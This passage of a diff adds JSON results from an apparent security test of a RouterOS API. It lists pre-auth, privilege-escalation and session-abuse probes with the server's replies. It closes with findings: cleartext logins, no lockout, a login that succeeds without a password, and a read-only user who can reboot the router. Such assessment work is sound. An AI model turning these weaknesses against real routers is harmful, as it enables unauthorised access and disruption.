+      "name": "preauth_tool_bandwidth-test",
+      "description": "Pre-auth: Bandwidth test",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.966965",
+      "details": {
+        "command": "/tool/bandwidth-test",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 180,
+      "category": "preauth_commands",
+      "name": "preauth_user_active_print",
+      "description": "Pre-auth: Active users",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.970963",
+      "details": {
+        "command": "/user/active/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 181,
+      "category": "preauth_commands",
+      "name": "preauth_certificate_print",
+      "description": "Pre-auth: Certificates",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.974961",
+      "details": {
+        "command": "/certificate/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 182,
+      "category": "preauth_commands",
+      "name": "preauth_ip_dns_print",
+      "description": "Pre-auth: DNS settings",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.978959",
+      "details": {
+        "command": "/ip/dns/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 183,
+      "category": "preauth_commands",
+      "name": "preauth_ip_service_print",
+      "description": "Pre-auth: Enabled services",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.978959",
+      "details": {
+        "command": "/ip/service/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 184,
+      "category": "preauth_commands",
+      "name": "preauth_system_history_print",
+      "description": "Pre-auth: Command history",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.982957",
+      "details": {
+        "command": "/system/history/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 185,
+      "category": "preauth_commands",
+      "name": "preauth_system_logging_print",
+      "description": "Pre-auth: Logging config",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.982957",
+      "details": {
+        "command": "/system/logging/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 186,
+      "category": "preauth_commands",
+      "name": "preauth_export",
+      "description": "Pre-auth: Configuration export",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.986955",
+      "details": {
+        "command": "/export",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 187,
+      "category": "preauth_commands",
+      "name": "preauth_system_license_print",
+      "description": "Pre-auth: License info",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.986955",
+      "details": {
+        "command": "/system/license/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 188,
+      "category": "preauth_commands",
+      "name": "preauth_ip_neighbor_print",
+      "description": "Pre-auth: Neighbor discovery",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.990953",
+      "details": {
+        "command": "/ip/neighbor/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 189,
+      "category": "preauth_commands",
+      "name": "preauth_system_clock_print",
+      "description": "Pre-auth: System clock",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.990953",
+      "details": {
+        "command": "/system/clock/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 190,
+      "category": "preauth_commands",
+      "name": "preauth_write_user_add",
+      "description": "Pre-auth write: Add user without auth",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.994951"
+    },
+    {
+      "id": 191,
+      "category": "preauth_commands",
+      "name": "preauth_write_system_identity_set",
+      "description": "Pre-auth write: Set identity without auth",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.994951"
+    },
+    {
+      "id": 192,
+      "category": "preauth_commands",
+      "name": "preauth_write_ip_address_add",
+      "description": "Pre-auth write: Add IP without auth",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.998949"
+    },
+    {
+      "id": 193,
+      "category": "preauth_commands",
+      "name": "preauth_write_system_script_add",
+      "description": "Pre-auth write: Add script without auth",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.998949"
+    },
+    {
+      "id": 194,
+      "category": "preauth_commands",
+      "name": "preauth_tagged_command",
+      "description": "Pre-auth command with .tag attribute (bypass attempt)",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:22.002947"
+    },
+    {
+      "id": 195,
+      "category": "preauth_commands",
+      "name": "preauth_race_login_command",
+      "description": "Send login + command in single TCP send (race condition)",
+      "result": "user_data_returned=False, replies=1",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:22.002947",
+      "details": {
+        "reply_count": 1,
+        "response": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 196,
+      "category": "preauth_commands",
+      "name": "preauth_attrs_only_no_command",
+      "description": "Send attribute words without command word (no /login)",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:22.006945",
+      "details": {
+        "response": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 197,
+      "category": "preauth_commands",
+      "name": "preauth_send_done_sentence",
+      "description": "Send !done (server reply) then try command",
+      "result": "blocked: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:22.502697"
+    },
+    {
+      "id": 198,
+      "category": "preauth_commands",
+      "name": "preauth_send_fatal",
+      "description": "Send !fatal sentence to server",
+      "result": "got 22 bytes: 0621666174616c0d6e6f74206c6f6767656420696e00",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.502197"
+    },
+    {
+      "id": 199,
+      "category": "privilege_escalation",
+      "name": "read_user_ip_address_add",
+      "description": "Read user (testread): Add IP address",
+      "result": "denied: !trap =message=not enough permissions (9) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.506195",
+      "details": {
+        "user": "testread",
+        "command": "/ip/address/add",
+        "response": "!trap =message=not enough permissions (9) | !done"
+      }
+    },
+    {
+      "id": 200,
+      "category": "privilege_escalation",
+      "name": "read_user_user_add",
+      "description": "Read user (testread): Add user",
+      "result": "denied: !trap =message=not enough permissions (9) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.510193",
+      "details": {
+        "user": "testread",
+        "command": "/user/add",
+        "response": "!trap =message=not enough permissions (9) | !done"
+      }
+    },
+    {
+      "id": 201,
+      "category": "privilege_escalation",
+      "name": "read_user_system_identity_set",
+      "description": "Read user (testread): Set system identity",
+      "result": "denied: !trap =message=not enough permissions (9) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.510193",
+      "details": {
+        "user": "testread",
+        "command": "/system/identity/set",
+        "response": "!trap =message=not enough permissions (9) | !done"
+      }
+    },
+    {
+      "id": 202,
+      "category": "privilege_escalation",
+      "name": "read_user_system_script_add",
+      "description": "Read user (testread): Add script",
+      "result": "denied: !trap =message=not enough permissions (9) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.510193",
+      "details": {
+        "user": "testread",
+        "command": "/system/script/add",
+        "response": "!trap =message=not enough permissions (9) | !done"
+      }
+    },
+    {
+      "id": 203,
+      "category": "privilege_escalation",
+      "name": "read_user_tool_fetch",
+      "description": "Read user (testread): Fetch remote file",
+      "result": "denied: !trap =message=failure: cannot open file: permission denied | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/tool/fetch",
+        "response": "!trap =message=failure: cannot open file: permission denied | !done"
+      }
+    },
+    {
+      "id": 204,
+      "category": "privilege_escalation",
+      "name": "read_user_system_reboot",
+      "description": "Read user (testread): Reboot system",
+      "result": "ALLOWED",
+      "anomaly": true,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/system/reboot",
+        "response": "!done"
+      }
+    },
+    {
+      "id": 205,
+      "category": "privilege_escalation",
+      "name": "read_user_file_remove",
+      "description": "Read user (testread): Delete file",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/file/remove",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 206,
+      "category": "privilege_escalation",
+      "name": "read_user_ip_firewall_filter_add",
+      "description": "Read user (testread): Add firewall rule",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/ip/firewall/filter/add",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 207,
+      "category": "privilege_escalation",
+      "name": "read_user_system_scheduler_add",
+      "description": "Read user (testread): Add scheduler task",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/system/scheduler/add",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 208,
+      "category": "privilege_escalation",
+      "name": "read_user_ip_dns_set",
+      "description": "Read user (testread): Change DNS servers",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/ip/dns/set",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 209,
+      "category": "privilege_escalation",
+      "name": "read_user_system_logging_add",
+      "description": "Read user (testread): Add logging target",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/system/logging/add",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 210,
+      "category": "privilege_escalation",
+      "name": "read_user_certificate_add",
+      "description": "Read user (testread): Add certificate",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "details": {
+        "user": "testread",
+        "command": "/certificate/add",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 211,
+      "category": "privilege_escalation",
+      "name": "write_user_user_add",
+      "description": "Write user (testwrite): Add full-access user",
+      "result": "denied: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169",
+      "details": {
+        "user": "testwrite",
+        "command": "/user/add",
+        "response": "no_response"
+      }
+    },
+    {
+      "id": 212,
+      "category": "privilege_escalation",
+      "name": "write_user_user_set",
+      "description": "Write user: Modify admin user group",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 213,
+      "category": "privilege_escalation",
+      "name": "write_user_certificate_add",
+      "description": "Write user: Add certificate",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 214,
+      "category": "privilege_escalation",
+      "name": "write_user_system_license_print",
+      "description": "Write user: View license (admin only)",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 215,
+      "category": "privilege_escalation",
+      "name": "write_user_system_reset-configuration",
+      "description": "Write user: Reset configuration",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 216,
+      "category": "privilege_escalation",
+      "name": "write_user_system_package_update_check-for-updates",
+      "description": "Write user: Check for updates",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 217,
+      "category": "privilege_escalation",
+      "name": "write_user_user_group_print",
+      "description": "Write user: List user groups",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 218,
+      "category": "privilege_escalation",
+      "name": "write_user_user_group_add",
+      "description": "Write user: Add user group",
+      "result": "error: [Errno 32] Broken pipe",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 219,
+      "category": "privilege_escalation",
+      "name": "api_policy_admin",
+      "description": "API policy for admin",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 220,
+      "category": "privilege_escalation",
+      "name": "api_policy_testfull",
+      "description": "API policy for testfull",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.558169"
+    },
+    {
+      "id": 221,
+      "category": "privilege_escalation",
+      "name": "api_policy_testread",
+      "description": "API policy for testread",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.562167"
+    },
+    {
+      "id": 222,
+      "category": "privilege_escalation",
+      "name": "api_policy_testwrite",
+      "description": "API policy for testwrite",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.562167"
+    },
+    {
+      "id": 223,
+      "category": "privilege_escalation",
+      "name": "read_user_sensitive_reads",
+      "description": "Read user sensitive data access",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.562167"
+    },
+    {
+      "id": 224,
+      "category": "session_abuse",
+      "name": "reconnect_no_reauth",
+      "description": "Reconnect without re-auth",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.562167"
+    },
+    {
+      "id": 225,
+      "category": "session_abuse",
+      "name": "rapid_connect_disconnect_20x",
+      "description": "20 rapid connect/disconnect cycles",
+      "result": "0/20 succeeded, 20 failed",
+      "anomaly": true,
+      "timestamp": "2026-02-15T23:18:23.578159",
+      "details": {
+        "failures": [
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused",
+          "fail: [Errno 111] Connection refused"
+        ]
+      }
+    },
+    {
+      "id": 226,
+      "category": "session_abuse",
+      "name": "double_login_same_socket",
+      "description": "Double login on same socket",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.578159"
+    },
+    {
+      "id": 227,
+      "category": "session_abuse",
+      "name": "session_confusion_privilege_check",
+      "description": "Session confusion privilege test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.578159"
+    },
+    {
+      "id": 228,
+      "category": "session_abuse",
+      "name": "multi_session_concurrent",
+      "description": "Multiple concurrent sessions",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.578159"
+    },
+    {
+      "id": 229,
+      "category": "session_abuse",
+      "name": "send_and_close",
+      "description": "Send and close",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.582157"
+    },
+    {
+      "id": 230,
+      "category": "session_abuse",
+      "name": "cancel_nonexistent_tag",
+      "description": "Cancel nonexistent tag",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.582157"
+    },
+    {
+      "id": 231,
+      "category": "session_abuse",
+      "name": "tag_collision",
+      "description": "Tag collision test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.582157"
+    },
+    {
+      "id": 232,
+      "category": "session_abuse",
+      "name": "listen_then_flood",
+      "description": "Listen + flood test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.582157"
+    },
+    {
+      "id": 233,
+      "category": "session_abuse",
+      "name": "quit_then_command",
+      "description": "/quit test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.582157"
+    },
+    {
+      "id": 234,
+      "category": "session_abuse",
+      "name": "failed_then_valid_login",
+      "description": "Failed then valid login",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155"
+    },
+    {
+      "id": 235,
+      "category": "session_abuse",
+      "name": "pipelining_10_commands",
+      "description": "Pipelining test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155"
+    },
+    {
+      "id": 236,
+      "category": "session_abuse",
+      "name": "cross_port_session_isolation",
+      "description": "Cross-port session isolation",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155"
+    },
+    {
+      "id": 237,
+      "category": "session_abuse",
+      "name": "small_recv_buffer",
+      "description": "Small recv buffer test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155"
+    },
+    {
+      "id": 238,
+      "category": "session_abuse",
+      "name": "idle_timeout_30s",
+      "description": "Idle timeout test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155"
+    },
+    {
+      "id": 239,
+      "category": "session_abuse",
+      "name": "max_concurrent_connections",
+      "description": "Open as many TCP connections as possible to API port",
+      "result": "0 connections accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.586155",
+      "details": {
+        "max_connections": 0
+      }
+    },
+    {
+      "id": 240,
+      "category": "session_abuse",
+      "name": "double_terminator",
+      "description": "Double terminator test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.590153"
+    },
+    {
+      "id": 241,
+      "category": "session_abuse",
+      "name": "long_session_50_commands",
+      "description": "Long session test",
+      "result": "error: [Errno 111] Connection refused",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:23.590153"
+    }
+  ],
+  "findings": [
+    {
+      "id": 1,
+      "severity": "HIGH",
+      "title": "Cleartext credential transmission on API port 8728",
+      "description": "The RouterOS API on port 8728 transmits login credentials (=name=, =password= attributes) over an unencrypted TCP connection. An attacker with network access can sniff credentials.",
+      "timestamp": "2026-02-15T23:16:03.724121",
+      "evidence_refs": [
+        "login_api_8728"
+      ],
+      "cwe": "CWE-319"
+    },
+    {
+      "id": 2,
+      "severity": "MEDIUM",
+      "title": "No account lockout on RouterOS API after 20 failed logins",
+      "description": "The RouterOS API port 8728 does not enforce account lockout after 20 consecutive failed login attempts with wrong passwords. This enables brute-force attacks.",
+      "timestamp": "2026-02-15T23:16:05.307329",
+      "evidence_refs": [
+        "bruteforce_lockout_20_attempts"
+      ],
+      "cwe": "CWE-307"
+    },
+    {
+      "id": 3,
+      "severity": "CRITICAL",
+      "title": "Login without password attribute succeeds",
+      "description": "Sending /login with =name= but no =password= succeeds",
+      "timestamp": "2026-02-15T23:16:11.788087",
+      "cwe": "CWE-287"
+    },
+    {
+      "id": 4,
+      "severity": "HIGH",
+      "title": "Privilege escalation: read user can Reboot system",
+      "description": "User 'testread' (read group) successfully executed write command: /system/reboot",
+      "timestamp": "2026-02-15T23:18:23.514191",
+      "evidence_refs": [
+        "read_user_system_reboot"
+      ],
+      "cwe": "CWE-269"
+    }
+  ]
+}
